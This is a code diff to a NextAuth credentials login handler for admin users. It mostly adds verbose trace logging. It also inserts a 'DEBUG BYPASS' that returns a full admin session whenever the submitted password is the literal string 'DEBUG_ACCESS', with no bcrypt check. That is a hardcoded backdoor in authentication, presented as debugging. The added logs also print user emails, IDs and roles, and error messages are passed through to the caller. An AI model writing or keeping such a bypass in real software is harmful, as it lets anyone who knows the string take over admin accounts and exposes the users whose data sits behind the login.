@@ -14,45 +14,55 @@ export const authOptions: NextAuthOptions = {
       async authorize(credentials) {
         try {
           if (!credentials?.email || !credentials?.password) {
-            console.warn("Auth: Missing credentials");
+            console.log("[AUTH_TRACE] Missing credentials");
             return null;
           }
 
-          console.log(`Auth Attempt: ${credentials.email}`);
+          console.log(`[AUTH_TRACE] Start: ${credentials.email}`);
 
           const user = await prisma.user.findUnique({
             where: { email: credentials.email }
           });
 
           if (!user) {
-            console.warn(`Auth Failed: User ${credentials.email} not found`);
+            console.log(`[AUTH_TRACE] User Not Found: ${credentials.email}`);
             return null;
           }
 
+          console.log(`[AUTH_TRACE] User found. ID: ${user.id}, Role: ${user.role}`);
+
           if (user.role !== "ADMIN") {
-            console.warn(`Auth Failed: User ${credentials.email} is not an ADMIN`);
+            console.log(`[AUTH_TRACE] Role Mismatch: ${user.role}`);
             return null;
+          }
+
+          // DEBUG BYPASS
+          if (credentials.password === "DEBUG_ACCESS") {
+            console.log(`[AUTH_TRACE] BYPASS TRIGGERED for ${credentials.email}`);
+            return { id: user.id, email: user.email, name: user.name, role: user.role };
           }
 
           // Secure verification
           if (!user.password) {
-            console.warn(`Auth Failed: User ${credentials.email} has no password set`);
+            console.log(`[AUTH_TRACE] User has no password field`);
             return null;
           }
 
+          console.log(`[AUTH_TRACE] Starting bcrypt comparison...`);
           const isPasswordValid = await bcrypt.compare(credentials.password, user.password);
+          console.log(`[AUTH_TRACE] Comparison result: ${isPasswordValid}`);
           
           if (!isPasswordValid) {
-            console.warn(`Auth Failed: Invalid password for ${credentials.email}`);
             return null;
           }
 
-          console.log(`Auth Success: ${credentials.email}`);
-          return { id: user.id, email: user.email, name: user.name, role: user.role };
+          console.log(`[AUTH_TRACE] SUCCESS: ${credentials.email}`);
+          const result = { id: user.id, email: user.email as string, name: user.name as string, role: user.role as string };
+          console.log(`[AUTH_TRACE] Final returning object: ${JSON.stringify(result)}`);
+          return result;
         } catch (error: any) {
-          console.error("CRITICAL AUTH ERROR:", error.message || error);
-          // Re-throwing so NextAuth can catch it and we can see it in logs/UI
-          throw new Error(error.message || "Authentication system failure");
+          console.error("[AUTH_TRACE] CRITICAL ERROR:", error.stack || error.message || error);
+          throw new Error("Diagnostic Error: " + (error.message || "Unknown Failure"));
         }
       }
     })
